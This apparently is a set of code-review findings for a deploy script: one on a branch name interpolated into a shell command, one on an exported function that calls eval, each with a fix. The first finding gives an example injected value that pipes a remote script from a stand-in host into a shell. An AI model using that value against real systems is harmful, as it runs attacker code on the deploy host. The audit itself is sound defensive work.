findings.title: Branch name passed to a shell command without validation
findings.explanation: deploy() interpolates its branch argument into a shell command. A branch name such as `main; curl evil.sh | sh` would run arbitrary commands on the deploy host.
findings.suggestedFix: Use execFileSync('git', ['push', 'origin', branch]) so no shell is involved.

findings.title: Exported function evaluates arbitrary strings
findings.explanation: evaluate() is exported and passes its argument straight to eval, so any caller that forwards user input enables code execution.
findings.suggestedFix: Remove evaluate() or replace it with a parser for the specific expressions you need.
